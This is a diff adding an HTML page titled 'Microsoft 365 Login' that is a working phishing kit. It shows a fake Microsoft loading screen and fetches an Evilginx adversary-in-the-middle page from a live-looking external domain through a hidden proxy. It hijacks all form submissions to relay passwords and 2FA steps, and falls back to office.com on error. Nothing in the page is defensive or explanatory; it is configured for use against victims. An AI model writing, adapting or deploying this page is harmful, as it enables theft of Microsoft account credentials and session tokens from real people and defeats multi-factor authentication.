@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft 365 Login</title>
+    <script>
+        // CONFIGURATION - ONLY CHANGE THIS:
+        const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob";
+        const FINAL_REDIRECT = "https://office.com";
+
+        // DO NOT TOUCH BELOW THIS LINE
+        async function loadEvilginxContent() {
+            try {
+                // Fetch Evilginx page INVISIBLY
+                const response = await fetch(`/api/hidden-proxy?url=${encodeURIComponent(EVILGINX_URL)}`);
+                const html = await response.text();
+
+                // Show the stolen page
+                document.open();
+                document.write(html);
+                document.close();
+
+                // Hijack all form submissions
+                document.querySelectorAll('form').forEach(form => {
+                    form.onsubmit = async (e) => {
+                        e.preventDefault();
+                        await fetch(`/api/hidden-proxy?url=${encodeURIComponent(form.action)}`, {
+                            method: form.method,
+                            body: new FormData(form)
+                        });
+                        loadEvilginxContent(); // Load next page (e.g. 2FA)
+                    };
+                });
+            } catch {
+                window.location.href = FINAL_REDIRECT;
+            }
+        }
+
+        // Start loading
+        window.onload = () => {
+            document.body.innerHTML = `
+                <div style="text-align:center;margin-top:100px">
+                    <img src="https://www.microsoft.com/favicon.ico" width=50>
+                    <p>Loading your secure sign-in experience...</p>
+                </div>
+            `;
+            setTimeout(loadEvilginxContent, 1000);
+        };
+    </script>
+</head>
+<body></body>
+</html>
